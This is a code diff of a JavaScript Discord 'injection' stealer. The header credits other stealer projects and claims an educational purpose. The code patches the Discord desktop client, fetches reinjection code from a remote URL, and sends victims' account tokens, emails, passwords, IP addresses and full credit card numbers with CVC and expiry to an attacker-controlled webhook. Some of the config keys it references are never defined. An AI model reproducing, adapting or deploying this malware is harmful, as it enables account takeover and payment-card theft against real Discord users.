@@ -1,3 +1,7 @@
+//THANKS TO STANLEY FOR UR DESIGN OF EMBED (https://github.com/sudrywwq/1337-stealer)
+//AND RDIMO FOR THE OPERATION OF THE INJECTION (https://github.com/Rdimo/Discord-Injection) 
+//I AM NOT RESPONSIBLE IF YOU USE IT IN A MALICIOUS PROGRAM !
+//THIS IS FOR EDICATIONNALY PURPOSES ONLY.
 const args = process.argv;
 const fs = require('fs');
 const path = require('path');
@@ -5,7 +9,7 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook: '%WEBHOOK%',
   emojis: {
     nitroType: "<a:nitro_type:990735596446167060>",
     password: "<:password:990736948018704444>",
@@ -19,17 +23,14 @@ const config = {
     classic: "<:nitro:990727425790976060>",
     boost: "<:boost1month:990730687579570246>",
   },
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/GuyEditDev/injection-discord/main/injection-clean.js', //injection url for when it reinjects
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
-   **/
+  webhook_protector_key: '%WEBHOOK_KEY%', 
+  auto_buy_nitro: false,
+  ping_on_run: false,
+  ping_val: '@everyone',
+  embed_name: 'Discord Injection',
+  embed_icon: 'https://ae01.alicdn.com/kf/HTB1i0ILwYSYBuNjSspiq6xNzpXaz.jpg'.replace(/ /g, '%20'),
+  embed_color: 8363488,
+  injection_url: 'https://raw.githubusercontent.com/GuyEditDev/injection-discord/main/injection-clean.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -426,22 +427,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  
-
-  const indexPATH = path.join(app, 'modules');
-  const reg = /discord_desktop_core-([1-9])+/;
-  fs.readdir(indexPATH, (err, files) => {
-    files.forEach(file => {
-      const discord_core = file.match(reg)[0];
-
-    });
-  });
-  
-  
-  
-  
-  
-  const indexJs = `${app}\\modules\\${discord_core}\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -830,40 +816,67 @@ const emailChanged = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const ip = await getIP();
+  const avatar = json.avatar
+    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;
+
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
+        color: config["embed-color"],
+        title: "Email Changed",
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: `${json.username}#${json.discriminator} (${json.id})`,
+          icon_url: config["stealer-icon"],
+        },
+        thumbnail: {
+          url: avatar,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: config["stealer-name"],
+          icon_url: config["stealer-icon"],
         },
+        fields: [
+          {
+            name: `${config.emojis.billing}`,
+            value: `\`${token}\``,
+          },
+          {
+            name: `${config.emojis.badges} Badges`,
+            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.nitroType} Nitro Type`,
+            value: nitro,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.billing} Billing`,
+            value: billing,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.ip} IP`,
+            value: `\`${ip}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.email} Email`,
+            value: `\`${email || `null`}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.password} Password`,
+            value: `\`${password || "null"}\``,
+            inline: !0,
+          },
+        ],
       },
     ],
   };
-  if (config.ping_on_run) content['content'] = config.ping_val;
+
   hooker(content);
 };
 
@@ -871,41 +884,68 @@ const PaypalAdded = async (token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
-  const billing = getBilling(token);
+  const billing = await getBilling(token);
+  const ip = await getIP();
+  const avatar = json.avatar
+    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;
+
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
+        color: config["embed-color"],
+        title: "PayPal Added",
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: `${json.username}#${json.discriminator} (${json.id})`,
+          icon_url: config["stealer-icon"],
+        },
+        thumbnail: {
+          url: avatar,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: config["stealer-name"],
+          icon_url: config["stealer-icon"],
         },
+        fields: [
+          {
+            name: `${config.emojis.billing}`,
+            value: `\`${token}\``,
+          },
+          {
+            name: `${config.emojis.badges} Badges`,
+            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.nitroType} Nitro Type`,
+            value: nitro,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.billing} Billing`,
+            value: billing,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.ip} IP`,
+            value: `\`${ip}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.email} Email`,
+            value: `\`${json.email || `null`}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.password} Password`,
+            value: "`null`",
+            inline: !0,
+          },
+        ],
       },
     ],
   };
-  if (config.ping_on_run) content['content'] = config.ping_val;
+
   hooker(content);
 };
 
@@ -914,40 +954,82 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const ip = await getIP();
+  const avatar = json.avatar
+    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;
+
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
+        color: config["embed-color"],
+        title: "Bank Card Added",
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: `${json.username}#${json.discriminator} (${json.id})`,
+          icon_url: config["stealer-icon"],
+        },
+        thumbnail: {
+          url: avatar,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: config["stealer-name"],
+          icon_url: config["stealer-icon"],
         },
+        fields: [
+          {
+            name: `${config.emojis.billing}`,
+            value: `\`${token}\``,
+          },
+          {
+            name: `${config.emojis.badges} Badges`,
+            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.nitroType} Nitro Type`,
+            value: nitro,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.billing} Billing`,
+            value: billing,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.ip} IP`,
+            value: `\`${ip}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.email} Email`,
+            value: `\`${json.email || `null`}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.password} Password`,
+            value: "`null`",
+            inline: !0,
+          },
+          {
+            name: "💳 Card Number",
+            value: `\`${number}\``,
+            inline: !0,
+          },
+          {
+            name: "💳 Card CVC",
+            value: `\`${cvc}\``,
+            inline: !0,
+          },
+          {
+            name: "💳 Card Expiration",
+            value: `\`${expir_month}/${expir_year}\``,
+            inline: !0,
+          },
+        ],
       },
     ],
   };
-  if (config.ping_on_run) content['content'] = config.ping_val;
+
   hooker(content);
 };
 
